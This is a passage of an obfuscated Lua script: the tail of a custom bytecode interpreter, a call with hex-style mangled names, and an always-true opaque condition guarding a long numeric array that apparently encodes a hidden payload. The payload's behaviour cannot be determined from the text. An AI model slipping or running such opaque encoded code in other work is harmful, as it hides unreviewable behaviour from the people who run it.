                Registers[inst.a] = (type(vB) == "number" and type(vC) == "number") and (vB + vC) or 0;
            elseif op == OpaqueMatrix[3] then
                local vB, vC = Registers[inst.b] or 1, Registers[inst.c] or 1;
                if type(vB) == "number" and type(vC) == "number" and vC ~= 0 then
                    Registers[inst.a] = math.floor(vB / vC);
                else
                    Registers[inst.a] = 0;
                end;
            elseif op == OpaqueMatrix[4] then
                return Registers[inst.a];
            end;
        end;
        PC = PC + 1;
    end;
end;

_0x_vm(_0xf91ad43, _0x6a8a779, _0x213c056, _0xp1, _0xp2, _0xp3, _0xp4, _0xsig);

if (math.floor(os.time() % 100) * 0 == 0) then
    
local _0x912815b = {136,109,105,0,117,120,150,190,219,224,246,68,105,2,49,44,219,241,159,255,28,62,78,86,106,122,198,164,194,245,6,117,71,70,111,141,167,228,137,172,86,78,21,56,33,140,134,177,232,161,8,51,77,117,154,138,179,166,210,227,37,113,93,115,107,170,181,184,200,241,69,105,5,49,219,195,219,215,197,232,2,54,126,48,221,245,149,151,252,25,6,43,91,67,204,158,232,232,146,79,81,108,2,113,142,163,218,251,213,191,2,84,97,4,252,220,161,188,189,86,116,20,54,210,200,224,154,191,66,83,114,111,10,208,203,252,128,166,70,65,125,27,51,37,206,237,157,188,89,85,99,26,15,211,241,145,179,175,69,125,116,25,60,44,207,232,135,173,68,118,103,89,99,134,161,201,171,134,79,97,115,74,114,154,180,200,133,167,127,91,68,94,99,158,189,222,224,237,11,33,13,91,103,154,167,214,176,48,3,116,18,24,58,197,136,157,194,92,124,73,70,109,115,145,201,170,135,120,118,24,112,104,100,200,231,199,239,45,38,84,125,156,140,170,163,227,239,12,25,3,114,104,160,213,199,172,137,77,34,68,117,242,239,176,216,223,170,80,114,70,126,149,171,167,208,193,22,19,40,117,32,140,178,218,208,204,58,15,63,72,65,199,233,141,146,186,164,127,28,38,0,217,185,202,197,182,20,55,81,110,157,138,185,208,177,161,24,45,45,71,154,197,252,209,168,160,25,42,69,120,98,149,236,143,241,224,3,33,99,9,221,232,237,191,161,75,76,113,68,117,78,201,228,155,41,74,82,98,14,37,138,190,247,136,170,84,55,115,73,53,214,242,144,211,229,16,22,31,17,95,211,251,154,177,237,11,46,56,83,111,163,241,194,253,16,19,27,45,88,114,165,246,157,246,10,60,88,87,77,114,164,248,197,233,39,51,75,119,67,12,228,231,134,164,74,2,18,119,119,152,144,229,131,184,85,119,92,126,101,133,141,233,159,231,6,33,71,106,154,109,180,219,205,219,68,115,15,124,158,148,181,248,172,25,5,27,95,127,139,188,208,176,139,28,15,41,8,112,198,245,235,213,252,230,46,104,69,105,138,163,157,156,250,16,49,89,118,190,142,185,212,233,172,85,43,104,75,148,141,187,200,198,253,12,110,24,62,36,193,146,158,157,177,90,125,21,12,205,250,150,174,178,165,65,117,86,106,154,144,144,136,10,232,20,32,78,125,130,156,149,183,251,230,4,57,93,71,195,172,221,240,18,47,61,88,40,5,217,190,219,247,162,21,69,119,0,122,154,185,193,205,8,53,20,111,76,111,133,189,219,212,17,32,90,3,1,214,169,233,203,228,26,41,91,90,81,99,200,225,129,174,87,127,1,5,50,218,236,245,142,165,87,118,27,42,42,212,241,234,208,235,15,45,100,46,102,145,179,216,228,168,19,49,107,45,49,135,182,215,252,21,12,125,82,105,186,149,171,221,199,125,109,65,42,44,129,136,175,186,149,231,41,91,94,120,206,207,232,220,238,25,16,89,108,137,163,190,161,207,230,40,114,88,77,156,141,161,138,202,245,8,11,19,59,37,192,183,193,132,245,1,42,64,108,211,183,214,242,234,231,2,35,87,46,210,186,177,203,253,227,80,96,8,35,136,181,210,240,194,239,50,32,83,118,170,238,195,205,48,83,123,20,83,98,157,188,208,227,244,204,68,45,118,103,133,142,133,173,2,0,57,6,10,106,150,167,242,182,15,35,56,41,115,220,246,165,200,237,21,51,2,9,64,97,180,161,208,234,16,88,66,37,28,220,191,173,200,130,104,48,66,89,105,128,252,250,131,236,19,34,97,72,125,179,183,195,225,229,11,61,98,66,108,129,147,156,243,17,56,40,95,72,106,133,185,253,128,86,127,106,44,9,42,128,189,206,227,242,116,87,70,99,120,146,169,197,253,87,121,80,100,151,128,142,242,129,168,83,54,76,66,191,207,136,161,235,174,72,34,71,93,36,187,190,187,220,224,6,14,19,124,155,170,255,153,242,247,30,20,18,37,152,178,166,162,244,208,85,40,76,90,134,189,212,218,172,140,84,67,6,118,153,168,188,172,249,14,59,72,83,38,211,248,222,226,254,198,17,45,106,97,179,162,192,229,198,30,35,74,104,42,134,184,212,251,21,44,53,49,126,187,253,159,131,169,123,119,124,87,86,98,146,184,137,228,26,25,58,77,126,129,188,226,128,226,23,56,53,81,60,222,249,239,207,242,1,4,101,89,118,137,190,244,141,166,27,43,49,73,115,129,164,252,179,17,52,101,67,69,71,214,187,214,246,62,124,97,64,78,101,131,167,250,172,227,62,107,69,90,106,150,204,162,144,123,125,80,120,159,245,234,181,194,236,89,122,29,2,242,13,194,229,194,235,14,37,67,120,116,223,250,230,152,174,95,107,28,122,151,190,187,202,253,228,74,48,74,124,140,178,171,151,184,163,66,104,69,122,139,136,243,212,209,245,28,111,6,104,144,165,193,208,213,67,59,82,83,37,205,247,146,142,190,95,66,77,16,98,159,168,139,138,172,80,118,30,8,35,234,221,213,250,253,78,119,98,62,220,252,158,130,168,175,89,116,59,44,102,139,175,128,236,230,29,57,13,50,211,188,165,194,234,15,29,16,88,122,178,244,179,129,17,58,8,48,10,59,222,163,198,197,213,13,31,35,105,52,218,145,195,219,76,42,100,43,65,37,213,246,153,190,84,125,104,99,1,33,195,231,141,181,95,80,58,41,67,42,198,236,134,234,1,61,82,113,118,155,133,163,206,204,12,60,123,27,100,154,158,165,197,246,7,34,83,48,82,142,176,168,218,228,82,38,88,60,142,213,249,232,187,243,6,53,14,43,219,219,254,227,185,162,77,105,7,39,227,225,188,223,204,11,124,62,72,100,150,170,161,223,242,27,120,92,119,36,204,246,240,141,189,94,65,76,17,119,149,184,170,200,249,14,61,126,9,112,186,182,209,222,199,1,55,34,114,183,251,128,129,212,235,12,48,81,82,96,140,170,191,203,243,13,35,64,46,210,248,224,138,165,161,81,88,56,58,208,249,228,128,94,93,127,73,36,49,219,246,147,131,164,166,75,75,39,60,217,159,253,217,1,62,5,108,26,36,132,167,208,189,31,61,5,45,76,32,194,230,140,180,94,121,117,79,43,57,206,249,141,253,25,59,102,71,101,156,145,156,132,244,3,57,79,108,120,140,136,163,131,163,69,105,15,22,0,219,210,197,137,172,81,103,16,59,54,212,222,187,254,238,13,114,4,40,124,150,185,139,184,187,31,61,82,103,115,184,243,145,215,6,62,31,88,106,167,211,190,216,251,22,27,74,104,119,138,128,156,193,238,28,6,101,117,97,135,158,232,196,239,12,53,112,85,116,170,175,186,226,251,30,52,38,60,156,179,156,159,133,173,87,114,15,63,10,238,234,216,202,245,36,105,11,48,209,164,202,221,194,244,35,127,71,109,142,172,144,242,238,29,56,98,8,48,218,245,146,130,130,143,103,37,90,120,149,238,142,176,84,115,108,98,4,112,128,177,212,255,7,9,71,97,51,204,193,233,137,178,26,25,61,41,87,105,139,227,200,242,7,35,49,70,69,222,196,226,139,235,4,54,31,30,123,137,157,133,128,170,29,46,36,65,112,180,237,165,193,199,80,102,15,25,53,211,243,149,147,114,78,60,94,73,94,151,169,179,191,238,28,38,85,87,40,129,163,217,214,93,122,106,11,46,50,200,241,182,149,86,118,24,60,34,41,211,238,161,150,24,49,33,58,42,47,142,169,206,228,31,50,125,5,58,174,153,185,209,225,56,118,23,111,129,188,142,202,193,223,76,61,75,124,158,174,149,201,209,241,24,25,71,126,145,176,158,169,199,23,27,112,95,125,140,182,142,206,238,15,60,53,116,98,139,181,215,224,199,237,73,31,8,51,207,237,141,175,152,117,4,36,64,34,219,241,134,187,170,29,1,45,108,159,166,228,217,246,245,3,60,17,6,47,152,186,206,194,6,10,28,11,121,158,129,172,228,246,17,27,45,82,65,145,149,162,199,161,13,3,36,64,62,149,179,164,198,198,28,33,35,77,123,160,191,198,249,24,70,54,35,7,55,216,251,224,182,95,74,76,78,71,107,140,239,158,131,76,121,115,88,89,126,175,240,148,183,6,59,94,116,99,40,220,185,217,223,89,118,55,97,68,88,156,163,245,178,0,55,88,69,179,179,187,143,194,230,11,53,30,116,157,159,173,157,207,238,23,49,97,85,174,67,136,201,197,233,75,47,64,43,207,245,252,230,129,94,78,69,63,115,131,179,192,149,184,74,108,122,22,62,216,233,171,218,211,243,9,82,98,50,139,161,197,249,179,95,43,49,65,85,133,183,230,131,227,29,1,94,81,152,178,170,253,221,232,20,52,98,77,99,131,181,138,249,245,12,47,124,113,151,139,152,202,246,242,18,119,90,123,219,198,226,128,160,161,69,107,57,16,156,187,160,134,160,76,83,108,13,119,148,165,208,242,17,9,1,10,6,101,153,179,208,214,92,65,16,58,71,80,156,171,229,154,23,61,42,41,103,99,136,166,213,213,25,38,87,95,63,105,148,164,221,185,22,56,32,86,108,120,137,172,202,196,6,35,88,69,61,156,131,235,142,179,73,114,29,57,54,252,213,149,138,225,23,32,64,127,50,140,139,154,158,174,15,37,65,94,154,129,186,177,243,83,30,58,80,98,191,153,173,218,255,89,123,31,5,45,215,209,238,180,146,160,0,83,79,124,159,170,140,142,176,75,126,59,86,116,145,165,128,150,253,3,3,74,79,145,172,163,161,143,185,84,113,97,2,37,202,202,164,131,175,80,109,75,118,148,147,170,224,209,246,29,35,84,67,212,150,181,254,234,211,9,56,83,122,215,244,228,133,168,172,66,107,60,31,192,240,143,182,8,237,24,39,102,123,159,182,253,224,14,230,47,111,82,119,134,185,230,242,8,54,0,103,10,47,197,238,153,181,83,89,89,8,62,59,208,184,198,241,22,31,12,87,107,101,178,234,215,242,11,36,107,44,110,152,143,234,141,178,72,113,28,23,53,255,218,213,196,225,7,110,78,78,122,138,144,153,196,228,73,103,7,41,6,255,191,176,254,8,31,109,13,53,110,150,178,216,249,22,31,83,86,109,83,159,185,200,223,175,1,85,67,126,131,170,164,217,238,51,125,103,2,223,229,226,251,210,249,23,21,78,51,149,178,137,178,205,246,6,54,96,13,97,154,211,166,212,174,64,110,67,96,153,166,234,171,213,228,51,117,95,124,155,133,174,248,191,87,6,37,86,124,153,135,249,199,195,216,12,56,84,119,229,194,187,152,254,236,9,77,41,112,155,189,157,255,242,232,66,125,0,108,137,165,192,253,28,27,11,41,106,126,141,161,219,251,28,81,104,30,53,113,140,175,201,249,23,25,44,92,90,51,139,172,202,241,10,42,56,46,116,187,152,160,192,242,8,62,122,88,113,156,162,154,206,231,27,57,42,92,116,147,141,251,209,229,4,37,73,73,43,151,176,227,190,91,75,70,34,87,103,151,253,213,254,25,121,0,3,68,123,134,184,223,248,238,11,84,103,99,102,137,142,195,250,26,61,102,26,215,37,154,178,211,226,27,15,95,105,147,191,229,171,194,254,6,44,90,78,109,135,158,170,221,236,45,34,89,127,150,255,134,166,200,228,81,58,86,102,140,128,187,210,242,17,33,36,92,123,179,187,182,172,196,170,6,32,20,48,206,238,186,190,252,242,7,39,69,51,201,247,217,199,243,241,2,126,123,96,128,185,219,201,250,6,5,35,8,45,195,236,189,158,154,125,54,88,121,36,206,233,134,156,155,29,48,81,61,40,196,226,130,164,72,77,95,50,127,132,139,169,205,176,91,78,45,70,97,154,179,153,191,167,81,75,104,24,57,220,193,151,128,129,106,32,49,84,126,208,229,226,243,27,9,107,109,18,40,209,252,152,182,86,120,28,97,35,30,206,235,155,188,95,68,26,3,13,41,199,231,163,128,23,53,32,0,60,44,205,240,149,171,84,127,27,57,56,240,211,237,148,166,95,126,22,107,107,103,171,235,219,255,11,62,12,48,214,221,199,226,191,175,80,115,24,46,215,33,253,155,145,112,72,29,1,106,155,129,131,225,136,208,113,59,92,95,142,237,226,234,182,243,5,21,65,58,132,179,180,158,252,233,1,76,88,67,196,247,146,222,251,18,17,2,100,34,146,185,222,145,175,79,113,21,59,35,205,232,133,148,181,88,125,19,60,13,238,175,196,235,242,76,48,91,117,148,135,169,239,226,246,12,30,91,102,135,149,150,249,239,233,4,40,116,117,137,129,240,191,238,8,2,99,12,103,134,184,162,180,29,0,5,45,103,116,153,245,196,249,28,35,15,45,90,115,171,234,222,245,31,67,16,49,94,96,206,162,193,224,19,12,55,87,53,120,128,166,192,223,30,44,91,113,55,159,180,227,139,181,80,109,29,62,0,37,251,228,143,129,100,105,11,47,52,220,198,225,190,174,79,114,23,7,24,100,178,223,186,92,64,102,14,56,211,207,255,224,131,168,84,74,86,96,137,203,237,145,183,95,73,100,1,49,210,212,249,143,184,163,127,55,16,155,141,172,240,154,181,82,66,99,6,43,193,234,244,144,174,78,112,20,58,34,204,231,201,190,189,95,40,91,122,113,204,171,211,192,241,75,115,29,56,213,197,230,137,141,163,76,119,19,49,209,243,151,189,132,174,73,102,22,55,240,210,209,240,236,164,9,35,65,122,140,246,174,254,16,243,72,122,16,59,209,250,215,252,4,25,56,31,65,120,204,233,153,186,93,66,119,96,11,39,197,229,135,171,81,121,66,29,58,42,203,238,147,169,120,80,120,22,54,216,252,226,138,180,79,108,28,28,63,36,250,227,142,170,72,104,10,13,51,219,239,205,249,227,11,113,22,11,52,223,251,153,185,91,127,101,13,55,49,206,254,159,130,167,125,102,17,45,42,224,193,153,166,94,68,115,0,60,32,219,175,203,249,172,109,78,115,138,129,130,153,153,169,81,24,54,76,105,143,132,182,249,163,29,61,91,57,33,203,197,226,146,179,86,123,17,58,37,193,159,158,128,164,74,114,28,55,212,196,229,231,140,162,75,92,63,57,170,252,197,212,243,250,13,43,21,58,160,240,199,242,247,244,4,47,3,43,181,251,204,245,198,241,2,36,7,114,139,183,155,246,255,21,42,120,101,48,214,232,221,244,29,242,16,124,4,118,150,172,134,170,80,87,65,28,57,41,202,237,146,168,81,91,119,21,53,215,251,225,137,179,78,107,122,27,62,35,211,207,195,236,15,51,104,118,60,137,139,239,235,233,3,112,105,23,51,164,244,203,247,42,41,33,66,21,116,131,188,158,248,168,47,42,96,92,108,135,235,146,168,93,62,108,108,65,95,133,178,195,182,229,51,90,59,165,46,149,161,232,228,21,14,97,25,52,222,191,252,221,227,60,57,87,118,32,111,141,225,145,178,85,122,16,57,36,192,253,157,191,163,73,113,27,54,211,195,195,230,139,161,74,95,60,38,142,185,164,214,195,172,75,48,81,114,138,188,231,222,192,227,19,104,82,116,137,152,132,204,231,228,18,26,75,98,140,171,148,140,177,0,56,109,82,106,132,231,219,249,249,16,57,30,9,37,195,227,133,169,174,86,64,27,56,40,201,236,145,167,175,90,118,20,52,214,250,202,165,178,77,73,121,26,61,34,248,225,140,168,70,69,103,11,49,217,195,158,187,171,76,78,115,35,31,212,183,216,254,13,60,49,63,80,47,195,252,217,197,246,43,37,34,79,40,196,251,134,250,21,11,111,85,89,111,156,246,145,181,225,52,74,118,122,223,137,172,212,253,3,127,96,3,7,221,198,241,141,171,75,109,17,55,62,40,195,224,144,177,84,121,15,56,35,244,209,140,234,162,69,112,19,61,153,98,141,169,201,174,26,59,16,51,206,139,182,202,209,234,10,38,19,120,150,191,190,214,133,161,127,31,1,37,203,243,252,151,180,164,69,104,13,35,204,247,242,144,176,82,118,28,46,3,134,162,150,159,247,23,59,94,0,96,139,174,197,241,254,28,113,73,123,110,156,158,221,215,239,63,117,87,125,148,249,150,215,227,227,64,60,80,112,96,129,179,194,169,247,8,47,94,69,149,144,220,220,170,238,3,51,8,56,212,189,192,255,20,29,18,32,29,125,135,178,200,202,233,40,3,11,9,99,137,168,141,247,30,9,61,93,66,72,157,167,202,210,16,47,76,121,52,153,141,170,216,254,45,51,77,32,96,220,128,188,197,226,29,108,16,21,61,39,194,159,143,176,83,120,14,55,1,221,251,155,189,161,71,69,52,61,56,107,130,171,197,28,70,32,64,45,49,206,226,204,128,230,4,33,93,127,214,218,240,153,132,160,126,30,0,36,202,209,251,150,179,163,68,103,12,34,225,248,180,220,227,20,117,27,3,45,200,229,244,149,184,93,115,28,7,35,193,225,200,171,232,26,59,25,54,38,199,234,238,132,173,88,116,18,50,212,248,158,134,143,170,71,119,50,22,41,254,203,195,196,244,77,46,90,110,131,193,156,185,136,169,76,113,7,48,219,247,149,181,87,90,64,104,18,45,202,250,155,190,163,114,108,40,70,99,198,163,205,247,8,225,126,85,78,100,155,244,155,179,67,100,119,64,120,143,195,173,220,176,77,125,125,96,5,219,196,239,139,169,73,107,110,20,60,38,193,158,142,175,82,119,13,63,45,220,250,154,188,160,70,110,24,18,47,223,192,227,136,94,71,114,14,11,43,205,241,151,191,131,105,37,95,119,52,217,239,152,131,95,125,29,63,35,40,208,250,149,178,162,67,102,11,33,41,212,240,142,132,125,125,10,2,32,215,195,255,132,191,11,55,85,8,49,146,176,181,198,238,37,125,5,53,124,146,129,174,204,224,18,5,31,97,129,191,157,228,142,169,70,118,23,58,223,245,158,232,132,162,66,100,8,46,214,192,155,151,135,168,75,112,6,47,240,219,157,206,187,10,48,23,70,105,135,249,150,196,143,4,15,27,80,96,139,231,135,201,182,241,50,106,93,110,128,251,222,247,19,86,51,91,121,142,164,137,148,178,76,30,49,94,86,188,160,224,218,250,0,73,109,19,59,37,192,157,141,174,81,118,107,20,63,219,249,153,187,95,69,109,118,17,46,222,255,226,135,119,107,63,41,66,126,204,138,152,237,231,51,55,85,94,51,197,243,151,248,80,47,83,78,86,98,129,249,208,255,224,66,28,4,108,103,163,184,200,227,79,110,4,1,82,43,145,189,227,225,30,63,26,65,111,159,254,152,138,249,29,12,64,113,106,36,218,241,130,211,88,33,95,64,133,179,181,227,203,225,69,117,22,57,222,244,252,231,131,161,65,99,7,45,213,255,249,150,134,167,74,111,5,46,243,216,154,211,252,8,50,39,16,39,156,189,222,201,193,34,58,44,71,119,204,182,216,202,219,187,40,75,72,126,190,183,206,240,232,87,104,21,100,148,177,190,214,224,170,22,58,93,76,149,194,237,137,167,166,72,108,18,58,36,255,156,140,173,80,84,106,19,62,218,248,152,186,94,110,102,117,16,45,221,254,225,134,92,69,79,107,9,41,203,239,149,189,167,66,31,110,15,50,215,199,187,197,19,62,27,28,0,38,206,248,147,176,160,65,100,104,62,39,210,238,140,172,78,114,24,0,9,36,235,220,128,181,85,112,16,22,63,163,253,150,145,169,90,123,65,114,80,35,204,235,147,167,93,121,15,34,209,197,250,255,140,230,12,36,89,121,221,210,251,230,130,160,64,98,6,44,212,221,248,149,133,166,73,110,4,45,216,244,241,145,179,87,125,101,37,7,130,164,187,223,191,85,126,105,5,35,195,229,232,142,182,160,123,24,8,41,204,241,135,143,186,86,116,20,28,247,151,169,192,140,163,89,45,92,80,216,203,236,154,133,184,71,42,89,105,111,191,155,139,172,174,83,105,18,61,217,247,151,185,93,162,74,116,15,44,220,253,224,133,91,163,78,106,8,40,224,195,218,249,238,21,125,120,0,33,214,240,149,215,29,40,121,93,118,37,205,247,146,175,95,64,66,103,61,38,209,237,139,171,77,113,23,30,8,35,192,240,145,158,116,46,80,50,114,157,252,210,195,235,31,54,21,17,1,34,197,234,128,169,84,112,14,46,47,211,249,225,139,166,67,115,20,55,59,209,208,200,196,9,45,52,70,43,118,157,162,229,208,240,39,35,106,105,132,147,149,144,191,91,124,100,14,41,198,213,246,153,190,84,125,104,4,34,194,195,231,141,181,95,122,23,7,40,225,221,236,192,246,28,39,82,103,140,155,244,166,139,167,88,61,89,82,135,129,167,163,132,168,87,98,94,113,111,243,210,222,203,224,82,117,17,107,153,164,150,244,250,226,6,63,14,43,219,252,159,132,185,162,77,105,7,39,201,237,147,187,165,95,124,108,13,48,213,235,190,146,75,12,120,23,62,45,196,189,210,225,18,29,79,53,115,37,205,236,206,239,31,32,52,81,66,34,179,174,211,252,20,110,118,97,61,219,251,157,129,167,79,121,115,16,0,33,196,233,191,168,83,111,13,12,46,248,213,175,206,165,75,60,90,90,121,216,189,173,204,31,8,51,77,7,98,151,191,199,246,233,21,45,100,43,113,159,174,143,184,5,41,43,5,108,109,152,180,238,238,26,114,52,79,104,116,183,171,222,245,56,121,82,72,102,202,199,236,200,238,29,62,115,103,145,240,150,163,195,243,34,53,73,65,176,255,141,171,194,163,1,44,67,117,96,178,252,165,219,237,55,40,68,110,182,251,210,223,252,238,7,17,64,120,155,157,158,167,244,232,4,63,6,38,200,236,146,186,131,94,123,107,12,47,212,234,147,190,185,87,119,25,23,14,194,253,219,238,243,17,3,107,104,107,207,246,137,185,31,78,56,93,69,110,178,238,143,178,87,76,117,96,60,218,250,156,128,166,78,87,114,15,63,32,195,194,147,227,28,43,107,92,98,157,164,159,133,225,13,53,53,93,116,207,172,176,254,27,125,19,54,90,113,142,166,146,213,236,10,56,1,19,112,145,187,255,228,1,21,44,101,67,112,146,145,151,244,6,52,41,79,76,223,204,232,139,179,93,120,21,5,38,40,205,227,140,183,83,113,17,51,215,220,196,238,163,139,24,50,82,107,213,223,193,182,199,242,1,45,89,69,32,186,165,179,196,222,88,102,28,76,212,244,238,136,185,17,8,56,95,123,156,140,177,179,246,198,69,32,76,99,137,164,242,213,208,28,28,106,77,103,150,186,222,217,184,86,118,24,60,34,202,244,143,139,187,92,127,100,58,35,228,199,204,230,236,77,115,27,5,32,253,237,142,177,181,75,116,31,59,217,249,155,191,165,172,124,92,7,54,139,139,166,234,168,26,31,43,94,44,208,246,158,136,163,64,79,112,19,56,206,247,226,190,92,124,125,97,7,47,217,244,145,171,143,1,36,90,8,120,142,168,223,237,83,55,36,34,81,34,195,243,139,165,81,59,45,48,114,159,192,162,195,178,92,119,20,4,4,39,204,226,139,182,82,112,16,50,53,219,195,237,136,165,85,118,25,20,30,220,199,227,129,161,67,103,13,53,223,217,246,230,135,170,79,101,14,57,213,210,242,148,184,116,107,52,69,109,216,216,251,224,182,95,74,102,4,36,198,234,239,151,129,92,121,105,10,45,210,232,240,155,157,120,124,7,59,45,217,243,225,154,178,12,59,45,55,49,159,166,211,197,237,58,114,7,4,134,168,165,206,192,248,15,5,16,106,138,176,154,190,131,171,85,112,13,61,222,193,230,188,165,175,75,105,9,43,207,245,157,135,162,94,78,111,18,55,231,219,232,199,85,9,51,16,81,107,150,243,156,249,175,23,7,110,80,119,128,236,128,214,92,43,48,25,83,100,159,250,194,255,30,119,6,82,124,143,153,128,137,172,91,51,94,35,81,64,168,239,218,231,25,111,15,16,52,218,194,236,135,164,84,117,24,28,50,219,198,226,128,160,66,102,12,52,61,216,245,229,134,131,99,42,72,112,103,209,139,157,228,18,53,56,79,105,54,202,231,159,207,80,26,42,115,116,128,134,238,210,206,26,120,17,7,127,158,182,184,223,248,84,105,11,58,89,198,130,163,249,238,31,51,98,124,111,141,232,157,139,244,4,1,78,70,144,251,246,246,142,203,71,33,82,73,128,178,215,156,196,227,84,111,12,60,221,192,229,187,131,174,74,104,8,42,206,244,156,134,128,93,77,110,17,54,230,216,233,253,241,9,55,94,5,33,131,183,200,237,225,214,2,91,71,98,197,187,217,232,61,76,42,58,66,116,163,180,210,248,28,87,95,30,111,147,142,181,205,254,90,57,48,34,77,105,202,224,137,180,80,110,109,15,51,217,193,235,134,163,83,116,118,27,49,218,197,225,191,95,107,72,11,18,60,215,244,228,133,168,77,99,12,22,50,208,240,146,182,92,68,110,9,5,53,214,211,179,189,19,7,45,86,99,113,146,169,149,176,90,51,34,91,123,110,137,171,153,185,66,123,91,112,146,40,152,191,201,245,89,97,97,118,104,155,138,165,132,234,11,51,87,78,221,250,201,234,141,178,72,113,28,56,214,246,247,155,129,169,83,110,11,59,220,255,228,153,168,128,89,51,7,36,205,250,147,175,252,19,0,46,30,102,132,244,130,154,252,29,41,78,69,96,147,241,194,255,253,238,10,28,5,48,204,234,138,172,175,85,125,103,2,223,207,240,147,184,173,86,65,29,59,219,253,203,170,224,29,83,121,46,72,107,138,151,204,250,3,13,26,93,123,214,147,166,204,246,39,31,39,91,86,217,128,174,255,94,73,52,59,89,51,146,186,175,197,209,31,43,100,70,125,134,187,228,248,9,2,11,103,64,122,148,248,148,187,25,17,42,77,97,113,143,226,199,242,16,34,19,74,91,111,162,237,220,250,19,114,80,125,113,103,142,164,226,250,10,58,6,121,139,124,164,237,196,236,15,33,88,98,145,138,137,143,140,244,11,57,83,96,213,212,246,154,128,168,82,109,10,58,219,254,194,152,129,172,72,102,6,40,230,223,183,166,246,15,75,110,6,112,134,156,245,153,166,33,123,29,30,54,213,190,194,213,238,242,0,109,73,125,138,143,135,205,231,18,50,41,98,147,156,174,244,150,234,28,64,28,58,218,252,224,134,174,183,82,111,31,0,35,200,158,173,159,173,75,107,13,49,215,255,233,132,161,176,81,116,25,47,216,233,178,180,85,52,1,39,92,121,219,161,173,131,187,75,80,61,20,124,143,173,223,248,90,66,75,102,3,51,212,247,156,178,91,70,98,31,63,33,239,198,185,144,81,49,32,32,88,94,130,190,195,255,4,113,28,22,104,119,135,173,134,186,68,106,17,37,53,112,133,175,140,236,28,47,91,0,39,215,137,167,194,228,7,61,79,82,32,133,245,213,254,228,30,32,9,57,218,220,193,151,128,171,71,101,5,39,203,208,248,226,151,119,67,124,0,34,201,219,252,220,243,19,40,111,76,111,145,184,159,149,251,22,2,84,76,77,135,186,166,239,173,95,107,113,8,133,140,163,254,221,255,21,50,27,36,217,191,218,192,220,197,16,60,74,115,119,199,209,199,211,227,6,106,12,48,214,254,232,131,191,175,80,115,24,46,215,194,158,150,113,84,5,34,74,105,135,241,238,130,241,250,54,44,19,35,216,253,129,163,81,248,11,40,12,122,135,183,214,177,71,69,14,81,119,116,133,184,199,248,87,56,2,39,72,96,194,235,150,178,80,112,113,21,59,35,205,232,133,181,86,121,52,62,114,98,139,181,129,178,73,125,21,0,57,130,149,174,206,175,3,39,25,20,50,210,244,152,190,166,80,107,8,56,18,246,192,150,191,170,70,100,4,38,41,207,247,225,150,116,12,46,88,102,110,158,188,214,216,91,126,79,68,110,129,140,158,223,253,31,16,25,15,45,157,148,167,220,223,23,60,37,108,212,204,209,239,192,249,26,58,26,116,153,185,209,175,139,181,80,109,29,62,33,198,156,228,143,171,99,68,11,47,213,253,231,225,190,174,79,114,23,45,252,236,148,193,180,15,15,22,77,56,223,164,165,210,197,238,49,103,31,46,181,226,221,253,199,28,73,104,121,63,129,186,234,243,81,244,58,83,51,204,145,166,197,248,19,36,66,126,6,127,132,173,199,240,59,11,54,85,105,34,128,166,199,251,25,120,124,18,59,38,194,224,128,162,70,108,115,55,21,220,191,232,218,225,52,57,37,82,101,130,243,155,233,224,28,44,65,89,55,215,255,236,176,250,10,19,87,86,105,154,165,224,183,32,70,58,67,96,114,157,187,194,231,92,33,95,78,38,34,158,166,205,249,24,52,24,28,44,115,151,164,211,216,20,63,34,109,219,102,138,173,220,229,82,125,25,55,215,249,252,226,138,180,79,108,54,16,110,138,179,183,199,249,7,24,4,126,134,180,197,253,189,254,1,1,66,126,148,148,207,153,245,26,60,42,65,55,210,239,159,159,130,167,125,102,17,45,203,193,160,222,249,23,28,42,83,127,161,250,215,230,248,225,126,1,60,141,141,152,211,186,248,16,2,45,73,42,192,233,148,176,173,77,111,19,57,33,203,204,174,179,84,86,123,17,58,37,193,159,191,161,69,96,95,21,115,145,129,181,251,227,6,14,33,102,62,151,187,208,242,235,45,36,55,84,80,217,242,132,172,160,28,35,44,13,111,153,180,210,186,5,8,104,115,22,60,206,189,219,242,83,33,74,109,79,118,203,245,152,253,25,4,71,83,10,106,133,167,201,230,80,120,98,61,57,41,202,237,146,168,81,124,50,27,147,132,183,160,207,179,83,107,85,125,156,35,249,226,141,169,71,103,9,45,211,218,196,181,145,226,8,56,65,43,144,186,182,218,249,20,27,41,94,119,183,161,169,203,224,168,59,44,86,98,133,137,166,221,244,59,71,38,113,110,208,189,217,206,182,229,51,90,59,147,136,168,204,152,245,25,64,97,4,41,255,232,147,142,134,97,68,63,49,40,154,172,206,241,253,59,46,85,106,42,147,210,247,244,214,4,35,90,80,211,195,228,135,172,161,74,117,59,2,229,220,209,245,230,77,71,100,20,53,216,253,147,150,138,13,9,47,97,109,143,181,220,245,26,7,0,105,19,36,131,177,219,241,82,116,24,29,5,47,202,231,151,184,91,64,60,51,71,96,139,183,133,231,6,56,34,27,108,103,135,236,215,238,80,123,23,53,52,214,250,224,162,159,103,71,94,117,120,34,248,225,140,168,70,102,8,6,28,157,141,219,187,171,76,111,20,42,211,221,249,151,183,89,87,78,79,123,149,204,252,157,128,165,123,100,15,43,201,200,234,142,180,92,70,75,19,106,129,183,246,140,181,160,124,26,58,220,192,230,237,151,178,79,127,96,3,40,254,231,219,160,225,9,34,17,42,223,135,173,206,211,177,84,121,15,56,35,255,157,189,190,162,72,112,26,53,210,194,227,134,138,160,73,116,16,4,227,162,209,227,227,231,54,44,103,96,132,181,214,187,187,161,43,76,72,65,159,160,216,250,85,164,69,104,13,35,204,247,147,177,81,115,118,28,4,46,201,230,150,183,90,127,116,29,34,9,140,167,204,252,78,34,44,83,83,115,155,174,210,166,83,122,68,86,106,148,181,239,200,197,24,58,80,93,60,103,190,224,139,167,69,101,7,10,48,216,194,157,186,170,75,110,19,41,49,220,248,188,155,29,47,46,79,52,46,203,251,156,191,164,122,99,14,42,39,199,233,141,179,113,104,36,115,104,206,208,245,139,180,95,123,25,57,219,255,196,236,150,177,78,126,31,2,39,215,232,180,194,239,74,108,16,54,222,200,227,159,143,176,83,120,14,55,34,254,156,155,189,161,71,111,25,52,251,236,168,166,198,95,85,115,65,100,130,140,216,250,193,232,9,46,83,117,214,251,145,186,132,160,126,30,0,36,202,242,156,183,179,163,68,103,12,34,203,246,146,176,80,81,117,27,41,0,140,183,192,219,22,41,39,79,78,103,193,252,131,243,30,29,26,82,117,103,133,166,195,228,8,121,116,18,50,212,248,158,134,176,75,104,119,24,59,32,246,159,138,166,68,100,101,9,47,215,193,156,185,131,103,35,87,79,100,219,163,198,252,51,48,34,72,80,97,134,187,221,190,189,121,38,95,93,75,137,156,216,225,19,0,31,122,101,44,207,244,138,179,94,122,24,56,218,221,19